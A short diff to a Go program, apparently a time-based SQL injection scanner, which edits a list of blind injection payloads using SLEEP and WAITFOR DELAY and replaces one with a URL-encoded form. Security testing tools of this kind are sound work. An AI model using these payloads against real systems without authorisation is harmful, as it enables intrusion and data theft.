@@ -117,7 +117,7 @@ func main() {
 		"';WAITFOR DELAY '0:0:tempoSQLi'--",
 		"'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
 		"/'XOR(SELECT(0)FROM(SELECT(SLEEP(tempoSQLi)))a)XOR'Z",
-		"+ORDER BY SLEEP(tempoSQLi)--",
+		"%27%20AND%20SLEEP(tempoSQLi)%23",
 		"') or SLEEP(tempoSQLi)--",
 	}
 
